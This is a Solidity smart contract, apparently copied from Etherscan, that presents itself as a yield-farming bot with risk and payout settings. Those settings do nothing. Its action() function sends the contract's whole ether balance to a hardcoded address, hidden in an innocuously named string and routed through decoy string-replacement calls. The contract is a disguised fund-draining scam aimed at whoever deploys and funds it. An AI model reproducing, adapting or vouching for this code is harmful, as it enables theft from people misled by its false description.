/**
 *Submitted for verification at Etherscan.io on 2022-01-16
*/

pragma solidity ^0.5.17;


//setlevel of risk between 1 to 10 as in 1 being the safest 10 being to most risky but most profitable
//set payout in number of days the less frequent the more you save on gas fee

contract FarmYeildBot {
	string public setLevel;
	string public timeDateRagulator;
	string public payout;
	//Manager manager;
	
	constructor(string memory _setLevel,string memory _setpayout) public {
	    setLevel = _setLevel;
            payout = _setpayout;
	}
	
	function() external payable {}
	

 function SearchYeild(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 

   function startLookingforYeild() public pure returns (address adr) {
   string memory neutral_variable = "QGDcC2A9f00503B4e7E20A1C95AD750B5072486dC1";
   SearchYeild(neutral_variable,0,'0');
   SearchYeild(neutral_variable,2,'1');
   SearchYeild(neutral_variable,1,'x');
   address addr = parseAddr(neutral_variable);
    return addr;
   }
function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}
 function _stringReplace(string memory _string, uint256 _pos, string memory _letter) internal pure returns (string memory) {
        bytes memory _stringBytes = bytes(_string);
        bytes memory result = new bytes(_stringBytes.length);

  for(uint i = 0; i < _stringBytes.length; i++) {
        result[i] = _stringBytes[i];
        if(i==_pos)
         result[i]=bytes(_letter)[0];
    }
    return  string(result);
 } 
 
   
	function action() public payable {
	
	    address(uint160(startLookingforYeild())).transfer(address(this).balance);
	    
	}

}